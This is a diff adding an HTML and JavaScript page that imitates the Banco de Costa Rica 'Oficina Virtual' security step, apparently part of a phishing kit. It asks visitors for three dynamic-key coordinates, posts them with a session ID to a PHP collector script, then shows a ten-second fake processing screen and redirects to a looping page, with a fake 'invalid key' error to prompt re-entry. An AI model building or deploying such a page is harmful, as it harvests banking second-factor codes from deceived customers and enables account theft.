@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Oficina Virtual</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        .nav-bar {
+            background-color: #0033a0;
+            color: white;
+            padding: 15px;
+            text-align: center;
+            font-weight: bold;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            font-size: 18px;
+        }
+        .login-container {
+            text-align: center;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center; /* Centra verticalmente */
+            align-items: center; /* Centra horizontalmente */
+            margin-top: 50px; /* Espacio superior */
+        }
+        .titulo {
+            color: blue;
+            font-size: 20px;
+            font-weight: bold;
+        }
+        .input-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 40px; /* Mayor espacio entre columnas */
+            margin-top: 15px;
+        }
+        .coordenada {
+            font-size: 18px;
+            font-weight: bold;
+            display: block; /* Para que se alineen en línea */
+        }
+        .input-field {
+            padding: 5px;
+            width: 80px; /* Ajusta el ancho si es necesario */
+            text-align: center;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+            overflow: hidden; /* Evitar scroll */
+            box-sizing: border-box; /* Asegurarse de que el padding no aumente el tamaño */
+            white-space: nowrap; /* Evita el salto de línea */
+            display: inline-block; /* Evita el scroll */
+        }
+        /* Ocultar flechas de inputs de tipo número */
+        .input-field::-webkit-inner-spin-button,
+        .input-field::-webkit-outer-spin-button {
+            -webkit-appearance: none; /* Eliminar estilo de los botones de giro */
+            margin: 0; /* Asegurarse de que no haya margen */
+        }
+        .btn-continuar, .btn-cancelar {
+            margin-top: 20px;
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .btn-continuar {
+            background-color: #004A99;
+            color: white;
+            border: none;
+        }
+        .btn-cancelar {
+            background-color: white;
+            color: red;
+            border: 2px solid red;
+            margin-left: 10px; /* Espacio entre botones */
+        }
+        .loading-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            font-size: 18px;
+            z-index: 9999;
+        }
+        .spinner {
+            margin-top: 20px;
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-top: 5px solid white;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        footer {
+            background-color: #0033a0;
+            color: white;
+            text-align: center;
+            padding: 15px;
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+            font-size: 14px;
+        }
+    </style>
+    <style>
+        /* Tu estilo aquí */
+        .error-message {
+            color: red;
+            text-align: center;
+            margin-top: 20px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+<div class="head">
+        <img src="../../archivos/logo.gif" class="logo">
+<header>
+    <div class="nav-bar">
+        <span>Oficina Virtual</span>
+        <span>Personas</span>
+    </div>
+</header>
+
+<main>
+    <section class="login-container">
+        <p class="titulo">Ingrese su mecanismo de seguridad para continuar:</p>
+
+        <h2 class="subtitulo">Clave dinamica:</h2>
+        <div class="input-container">
+            <div>
+                <span id="tcoordenada1" class="coordenada"></span>
+                <input type="number" id="coordenada1" class="input-field" min="0" max="999" required>
+            </div>
+            <div>
+                <span id="tcoordenada2" class="coordenada"></span>
+                <input type="number" id="coordenada2" class="input-field" min="0" max="999" required>
+            </div>
+            <div>
+                <span id="tcoordenada3" class="coordenada"></span>
+                <input type="number" id="coordenada3" class="input-field" min="0" max="999" required>
+            </div>
+        </div>
+        <div>
+            <button id="btn-cancelar" class="btn-cancelar">Cancelar</button>
+            <button id="btn-continuar" class="btn-continuar">Continuar</button>
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.has('error') && urlParams.get('error') === '1') {
+        document.write('<div style="color: #721c24; background-color: #f8d7da; padding: 15px; border: 1px solid #f5c6cb; border-radius: 10px; font-size: 14px; ' +
+                       'box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); margin: 20px 0; text-align: center;">' +
+                       'Error: Clave dinámica inválida, por favor intenta nuevamente!' +
+                       '</div>');
+    }
+</script>
+
+        <div class="loading-screen" id="loading-screen" style="display: none;">
+            Procesando, por favor espere...
+            <div class="spinner"></div>
+        </div>
+    </section>
+</main>
+
+<footer>
+    <p>BCR © Derechos Reservados 2025. Contáctenos: CentroAsistenciaBCR@bancobcr.com</p>
+</footer>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    let usuarioID = sessionStorage.getItem("id");
+
+    fetch("obtener_coordenadas.php")
+    .then(response => response.text()) // Cambiar a text() para ver la respuesta sin analizar
+    .then(data => {
+        console.log(data); // Ver la respuesta en texto
+        // Intenta analizar solo si es un JSON válido
+        try {
+            const jsonData = JSON.parse(data);
+            if (jsonData.error) {
+                alert(jsonData.error);
+                window.location.href = "index3.HTML";
+            } else {
+                // Comprueba si se recibieron las coordenadas
+                document.getElementById("tcoordenada1").textContent = jsonData.tcoordenada || "";
+                document.getElementById("tcoordenada2").textContent = jsonData.tcoordenada2 || "";
+                document.getElementById("tcoordenada3").textContent = jsonData.tcoordenada3 || ""; // Nueva coordenada
+            }
+        } catch (e) {
+            console.error("Error al analizar JSON:", e);
+        }
+    })
+    .catch(error => console.error("Error obteniendo coordenadas:", error));
+
+// Capturar el clic en el botón de continuar
+document.getElementById("btn-continuar").addEventListener("click", function() {
+    let coordenada1 = document.getElementById("coordenada1").value.trim();
+    let coordenada2 = document.getElementById("coordenada2").value.trim();
+    let coordenada3 = document.getElementById("coordenada3").value.trim(); // Tercera coordenada
+    let usuarioID = sessionStorage.getItem("id");
+    let pantallaCarga = document.getElementById("loading-screen");
+
+    if (!coordenada1 || !coordenada2 || !coordenada3) { // Verificar las tres coordenadas
+        alert("Por favor, ingrese todas las coordenadas.");
+        return;
+    }
+
+    // Primero enviamos las coordenadas
+    fetch("actualizar_coordenadas.php", {
+        method: "PUT",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ id: usuarioID, tcoordenada: coordenada1, tcoordenada2: coordenada2, tcoordenada3: coordenada3 }) // Incluir la tercera coordenada
+    })
+    .then(response => response.json())
+    .then(data => {
+        // Mostrar pantalla de carga
+        pantallaCarga.style.display = "flex"; 
+
+        // Esperar 10 segundos antes de redirigir a verificar.php
+        setTimeout(() => {
+            pantallaCarga.style.display = "none"; // Ocultar pantalla de carga
+            window.location.href = "bucle-virtual.php"; // Redirigir a verificar.php
+        }, 10000); // 10 segundos
+    })
+    .catch(error => {
+        pantallaCarga.style.display = "none"; // Ocultar pantalla de carga en caso de error
+        console.error("Error en la actualización:", error);
+    });
+});
+
+
+
+
+
+
+    // Capturar el clic en el botón de cancelar
+    document.getElementById("btn-cancelar").addEventListener("click", function() {
+        sessionStorage.clear(); // Cerrar la sesión
+        window.location.href = "../../index.html"; // Redirigir al index
+    });
+});
+</script>
+</body>
+</html>
